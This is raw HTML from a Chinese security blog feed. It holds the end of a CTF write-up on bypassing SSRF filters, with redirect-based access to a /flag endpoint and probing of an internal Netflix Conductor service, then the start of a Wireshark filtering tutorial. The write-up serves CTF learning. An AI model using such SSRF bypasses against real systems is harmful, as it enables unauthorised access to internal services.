=&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="regexp">/127\.0\.0\.1/</span>.test(req.ip))&#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(&#123;<span class="attr">title</span>: <span class="string">&#x27;Error&#x27;</span>, <span class="attr">content</span>: <span class="string">&#x27;No Flag For You!&#x27;</span>&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;<span class="attr">hint</span>: hint&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>代码里提供 <code>/proxy</code> 接口可以代理访问，然后这个接口是本机访问的，所以可以跳过这个限制</p><p>绕过点1</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SSRF_WAF</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> host = <span class="keyword">new</span> UrlParse(url).hostname.replace(<span class="regexp">/\[|\]/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> isIp(host) &amp;&amp; IP.isPublic(host)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你传入的要是ip，，不能是域名，而且，ip必须是公网ip，其实这个好办，整个公网服务器，然后</p><p>写入代码重定向即可</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617438507933-f4a12b2e-a3b0-4509-a7c9-d12d8bcd107d.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617438507933-f4a12b2e-a3b0-4509-a7c9-d12d8bcd107d.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>至于为啥在这里写 <code>/flag</code> 是因为内部代理请求不会触发这个waf 机制</p><p>绕过点2</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FLAG_WAF</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> pathname = <span class="keyword">new</span> UrlParse(url).pathname</span><br><span class="line">    <span class="keyword">return</span> !pathname.startsWith(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造一下</p><p><img src="/img/2021hfctf/image-20210403192837797.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403192837797.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403192837797"></p><p>即可得到提示，</p><p>大概意思是他们在内网部署了 netflix conductor 服务器，让我们 SSRF 一下，这里熟悉 docker 的 <a href="https://guo.moe/">果果</a> 同学跟我说题目都是 docker 搭建的，会不会，，这个 netflix 服务也是 docker 来的呢？</p><p><img src="/img/2021hfctf/image-20210403193312651.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403193312651.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403193312651"></p><p><img src="/img/2021hfctf/image-20210403193452042.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403193452042.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403193452042"></p><p>膜拜.jpg ，至于为什么知道是 8080 端口，搜一下 netflix 官方部署文档，就 8080 和 5000 两个端口。</p><p>当然，这里还有小差曲，我一开始暴力破解，，内网ip 和 端口，直接把它给弄宕机了。。。</p><p>源码有点长，提取关键部分</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.swaggerUi = <span class="keyword">new</span> SwaggerUi(&#123;</span><br><span class="line">                  url: url + <span class="string">&quot;/api/swagger.json&quot;</span>,</span><br><span class="line">                  dom_id: <span class="string">&quot;swagger-ui-container&quot;</span>,</span><br><span class="line">                  supportedSubmitMethods: [<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;post&#x27;</span>, <span class="string">&#x27;put&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;patch&#x27;</span>],</span><br><span class="line">                  onComplete: <span class="function"><span class="keyword">function</span>(<span class="params">swaggerApi, swaggerUi</span>)</span>&#123;</span><br><span class="line">                      <span class="built_in">window</span>.swaggerUi.api.setBasePath(<span class="string">&quot;/api&quot;</span>);</span><br><span class="line">                      <span class="keyword">if</span>(<span class="keyword">typeof</span> initOAuth == <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">                          initOAuth(&#123;</span><br><span class="line">                              clientId: <span class="string">&quot;your-client-id&quot;</span>,</span><br><span class="line">                              clientSecret: <span class="string">&quot;your-client-secret-if-required&quot;</span>,</span><br><span class="line">                              realm: <span class="string">&quot;your-realms&quot;</span>,</span><br><span class="line">                              appName: <span class="string">&quot;your-app-name&quot;</span>,</span><br><span class="line">                              scopeSeparator: <span class="string">&quot; &quot;</span>,</span><br><span class="line">                              additionalQueryStringParams: &#123;&#125;</span><br><span class="line">                          &#125;);</span><br><span class="line">                      &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>然后还发现了个 json 文件</p><p><img src="/img/2021hfctf/image-20210403193726603.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403193726603.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403193726603"></p><p>然后到这就卡住了</p><p>网上搜了一下 CVE， <a href="https://xz.aliyun.com/t/7889">https://xz.aliyun.com/t/7889</a> 毕竟  SSRF 常见都是和 Redis 之类的的，一般都是公开漏洞，然后接口好像也可以正常访问</p><p><img src="/img/2021hfctf/image-20210403193837506.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403193837506.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403193837506"></p><p>正打算看看能不能 CRLF 啥的，看看能不能发送 POST 请求过去利用 CVE，但突然就访问不了了，，，</p><p><img src="/img/2021hfctf/image-20210403193944899.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403193944899.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403193944899"></p><p>不知道思路是不是跑偏了，然后被举办方给看到了 ，就直接卡了，然后就没啥时间了，也没来得及试其他的，做等 wp，我很好奇.jpg</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wireshark入门与实战</title>
      <link href="2021/04/01/Wireshark%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AE%9E%E6%88%98/"/>
      <url>2021/04/01/Wireshark%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>wireshark入门: <a href="https://www.bilibili.com/video/BV1X5411x7R4">https://www.bilibili.com/video/BV1X5411x7R4</a><br>他这里顺序有点误，应该是 P1-P26，P32-P39，P27-P31<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403656841-61d27bdc-5155-4965-b349-3cf88782698c.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403656841-61d27bdc-5155-4965-b349-3cf88782698c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><h1 id="Wireshark-入门"><a href="#Wireshark-入门" class="headerlink" title="Wireshark 入门"></a>Wireshark 入门</h1><h2 id="伯克利包过滤-Wireshark包过滤"><a href="#伯克利包过滤-Wireshark包过滤" class="headerlink" title="伯克利包过滤 - Wireshark包过滤"></a>伯克利包过滤 - Wireshark包过滤</h2><p>BPF（Berkeley Packet Filter） 采用与自然语言相近的语法，利用语法构造字符串确定保留具体符合规则的数据包而忽略其他数据包</p><p>最简单语法空白字符，任何数据包都符合空白字符规则</p><h3 id="语法规则"><a href="#语法规则" class="headerlink" title="语法规则"></a>语法规则</h3><ul><li>type表示对象 如 IP地址、子网或端口 -&gt; host、net、port</li><li>dir 表示数据包传输的方向 -&gt; src、dst</li><li>proto 表示与数据包匹配的协议类型 -&gt; ether、ip、tcp、arp</li></ul><h3 id="演示实例"><a href="#演示实例" class="headerlink" title="演示实例"></a>演示实例</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403656706-a2c7be3e-a13f-4e9f-8aab-d43c34f7eb2f.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403656706-a2c7be3e-a13f-4e9f-8aab-d43c34f7eb2f.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">会发现直接在 Apply a display filter 里输入是无法过滤的，<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605596923337-d58d67de-11ac-40bc-b8f2-db9247089e3a.png#align=left&display=inline&height=81&margin=%5Bobject%20Object%5D&name=image.png&originHeight=162&originWidth=2030&size=49871&status=done&style=none&width=1015" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605596923337-d58d67de-11ac-40bc-b8f2-db9247089e3a.png#align=left&display=inline&height=81&margin=%5Bobject%20Object%5D&name=image.png&originHeight=162&originWidth=2030&size=49871&status=done&style=none&width=1015" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>新版的 wireshark 的 expression 功能在如下图所示这里<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605596905704-d89032c3-4269-4f6e-8810-ce1b552bebfa.png#align=left&display=inline&height=102&margin=%5Bobject%20Object%5D&name=image.png&originHeight=204&originWidth=1092&size=351036&status=done&style=none&width=546" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605596905704-d89032c3-4269-4f6e-8810-ce1b552bebfa.png#align=left&display=inline&height=102&margin=%5Bobject%20Object%5D&name=image.png&originHeight=204&originWidth=1092&size=351036&status=done&style=none&width=546" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597076739-900b2bb3-44ab-4f94-9ec3-bf9505a48b59.png#align=left&display=inline&height=1560&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1560&originWidth=1364&size=294373&status=done&style=none&width=1364" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597076739-900b2bb3-44ab-4f94-9ec3-bf9505a48b59.png#align=left&display=inline&height=1560&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1560&originWidth=1364&size=294373&status=done&style=none&width=1364" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>在 wireshark 里，不是直接使用 host 来表示主机名和对应的 ip 地址，而是使用 <code>ip.addr = &lt;ip&gt;</code> 来表示<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597207635-3bdda931-5a71-4992-9606-8571a61abf33.png#align=left&display=inline&height=538&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1076&originWidth=2048&size=415173&status=done&style=none&width=1024" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597207635-3bdda931-5a71-4992-9606-8571a61abf33.png#align=left&display=inline&height=538&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1076&originWidth=2048&size=415173&status=done&style=none&width=1024" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>其他也是类似，如 <code>ip.src</code> 和 <code>ip.dst</code></p><p>在找服务这一块，服务都是以占用端口的形式展示的，因此可以通过这种形式来看怎么用，然后点OK即可。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597599273-503985ea-6cb9-4db9-ab74-510f0be84fe4.png#align=left&display=inline&height=790&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1580&originWidth=1382&size=225399&status=done&style=none&width=691" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597599273-503985ea-6cb9-4db9-ab74-510f0be84fe4.png#align=left&display=inline&height=790&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1580&originWidth=1382&size=225399&status=done&style=none&width=691" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597669802-2e2afe27-0f4e-46fa-89da-02a723a37013.png#align=left&display=inline&height=147&margin=%5Bobject%20Object%5D&name=image.png&originHeight=294&originWidth=1858&size=103612&status=done&style=none&width=929" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597669802-2e2afe27-0f4e-46fa-89da-02a723a37013.png#align=left&display=inline&height=147&margin=%5Bobject%20Object%5D&name=image.png&originHeight=294&originWidth=1858&size=103612&status=done&style=none&width=929" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>也可以使用 逻辑运算符实现筛选，如 <code>tcp.port == 80 and ip.src == 192.168.123.37</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597781937-1d89cd2f-0eb3-41f1-a3bb-df0d14953671.png#align=left&display=inline&height=195&margin=%5Bobject%20Object%5D&name=image.png&originHeight=390&originWidth=1776&size=148999&status=done&style=none&width=888" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597781937-1d89cd2f-0eb3-41f1-a3bb-df0d14953671.png#align=left&display=inline&height=195&margin=%5Bobject%20Object%5D&name=image.png&originHeight=390&originWidth=1776&size=148999&status=done&style=none&width=888" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>当然也有类似补全的操作<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597947739-2a348fee-51e0-4c72-8253-9b2ded65fbdc.png#align=left&display=inline&height=330&margin=%5Bobject%20Object%5D&name=image.png&originHeight=660&originWidth=644&size=127152&status=done&style=none&width=322" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597947739-2a348fee-51e0-4c72-8253-9b2ded65fbdc.png#align=left&display=inline&height=330&margin=%5Bobject%20Object%5D&name=image.png&originHeight=660&originWidth=644&size=127152&status=done&style=none&width=322" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h3 id="wireshark包过滤器分类-遵循伯克利语法规则"><a href="#wireshark包过滤器分类-遵循伯克利语法规则" class="headerlink" title="wireshark包过滤器分类 - 遵循伯克利语法规则"></a>wireshark包过滤器分类 - 遵循伯克利语法规则</h3><h4 id="捕获过滤器-gt-在抓包之前进行设置，在抓取时，就不会抓取不符合文件的数据包"><a href="#捕获过滤器-gt-在抓包之前进行设置，在抓取时，就不会抓取不符合文件的数据包" class="headerlink" title="捕获过滤器 -&gt; 在抓包之前进行设置，在抓取时，就不会抓取不符合文件的数据包"></a>捕获过滤器 -&gt; 在抓包之前进行设置，在抓取时，就不会抓取不符合文件的数据包</h4><ul><li>只捕获目标端口为80的TCP数据包 -&gt; tcp dst port 80</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605600789660-89c5429d-7f5f-4183-a4d9-30e155016176.png#align=left&display=inline&height=266&margin=%5Bobject%20Object%5D&name=image.png&originHeight=532&originWidth=1854&size=93280&status=done&style=none&width=927" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605600789660-89c5429d-7f5f-4183-a4d9-30e155016176.png#align=left&display=inline&height=266&margin=%5Bobject%20Object%5D&name=image.png&originHeight=532&originWidth=1854&size=93280&status=done&style=none&width=927" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><ul><li>捕获目的主机IP地址为 192.168.123.37 的数据包 -&gt;  dst host 192.168.123.37</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605598844368-732cad15-57e4-4dd9-abf0-d71be66473cf.png#align=left&display=inline&height=622&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1244&originWidth=1940&size=424659&status=done&style=none&width=970" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605598844368-732cad15-57e4-4dd9-abf0-d71be66473cf.png#align=left&display=inline&height=622&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1244&originWidth=1940&size=424659&status=done&style=none&width=970" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><ul><li>host 不支持 cidr 域名 书写</li></ul><hr><h4 id="筛选过滤器-（显示过滤器）-gt-抓包之后进行应用的，即再次筛选"><a href="#筛选过滤器-（显示过滤器）-gt-抓包之后进行应用的，即再次筛选" class="headerlink" title="筛选过滤器 （显示过滤器）-&gt; 抓包之后进行应用的，即再次筛选"></a>筛选过滤器 （显示过滤器）-&gt; 抓包之后进行应用的，即再次筛选</h4><p>然后显示过滤器有两种创建方式</p><ol><li>输入框创建</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605601233639-e457aa42-a7b5-4891-8fc2-c698c34c1ecd.png#align=left&display=inline&height=81&margin=%5Bobject%20Object%5D&name=image.png&originHeight=162&originWidth=1978&size=53501&status=done&style=none&width=989" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605601233639-e457aa42-a7b5-4891-8fc2-c698c34c1ecd.png#align=left&display=inline&height=81&margin=%5Bobject%20Object%5D&name=image.png&originHeight=162&originWidth=1978&size=53501&status=done&style=none&width=989" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>当不知道如何创建就看下图这里<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605596905704-d89032c3-4269-4f6e-8810-ce1b552bebfa.png#align=left&display=inline&height=102&margin=%5Bobject%20Object%5D&name=image.png&originHeight=204&originWidth=1092&size=351036&status=done&style=none&width=546" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605596905704-d89032c3-4269-4f6e-8810-ce1b552bebfa.png#align=left&display=inline&height=102&margin=%5Bobject%20Object%5D&name=image.png&originHeight=204&originWidth=1092&size=351036&status=done&style=none&width=546" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605601817671-4b8aacb8-a22a-46ca-a9ee-3d63fc6252b0.png#align=left&display=inline&height=127&margin=%5Bobject%20Object%5D&name=image.png&originHeight=254&originWidth=1676&size=71687&status=done&style=none&width=838" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605601817671-4b8aacb8-a22a-46ca-a9ee-3d63fc6252b0.png#align=left&display=inline&height=127&margin=%5Bobject%20Object%5D&name=image.png&originHeight=254&originWidth=1676&size=71687&status=done&style=none&width=838" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><ol start="2"><li>数据包细节面板创建</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605601904173-042a79ec-cc27-412c-af8e-31788678c6cd.png#align=left&display=inline&height=958&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1916&originWidth=1916&size=548155&status=done&style=none&width=958" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605601904173-042a79ec-cc27-412c-af8e-31788678c6cd.png#align=left&display=inline&height=958&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1916&originWidth=1916&size=548155&status=done&style=none&width=958" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><code>... and Selected</code> 表示 <code>目前的过滤器 + and 进行连接</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605602001225-0aa493f3-13c3-4b9e-8289-03f735d8542a.png#align=left&display=inline&height=274&margin=%5Bobject%20Object%5D&name=image.png&originHeight=548&originWidth=1742&size=173915&status=done&style=none&width=871" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605602001225-0aa493f3-13c3-4b9e-8289-03f735d8542a.png#align=left&display=inline&height=274&margin=%5Bobject%20Object%5D&name=image.png&originHeight=548&originWidth=1742&size=173915&status=done&style=none&width=871" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>一开始是只有 <code>Selected</code> 和 Not <code>Selected</code> 的</p><ul><li>表达式规则<ul><li>主题 + 运算符 + 值</li><li>逻辑关系 与 或 非 -&gt; and (&amp;&amp;) or (||) not (!)</li></ul></li></ul><hr><h2 id="Wireshark-捕获数据包文件保存"><a href="#Wireshark-捕获数据包文件保存" class="headerlink" title="Wireshark 捕获数据包文件保存"></a>Wireshark 捕获数据包文件保存</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403657147-c0c230fd-d6d4-4ce2-947c-7ad19f6b7a2c.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403657147-c0c230fd-d6d4-4ce2-947c-7ad19f6b7a2c.png" 